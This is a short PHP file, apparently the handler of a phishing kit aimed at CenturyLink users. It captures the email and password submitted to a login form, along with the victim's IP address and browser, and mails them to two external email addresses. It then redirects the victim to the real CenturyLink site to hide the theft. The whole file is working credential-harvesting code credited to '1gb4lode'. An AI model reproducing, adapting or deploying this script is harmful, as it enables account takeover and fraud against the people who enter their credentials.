<?

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "--------Created By 1gb4lode -----\n";
$message .= "Email    : ".$_POST['username']."\n";
$message .= "Password     : ".$_POST['password']."\n";
$message .= "--------------i.p----------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "-------Created By 1gb4lode----------\n";


$recipient = "legalfireworks@excite.com,legalfireworks@protonmail.com";
$subject = " ".$_POST['username']."";
$headers = "Moded By 1gb4lode";
mail($recipient,$subject,$message,$headers);
header("Location: https://centurylink.net");
?>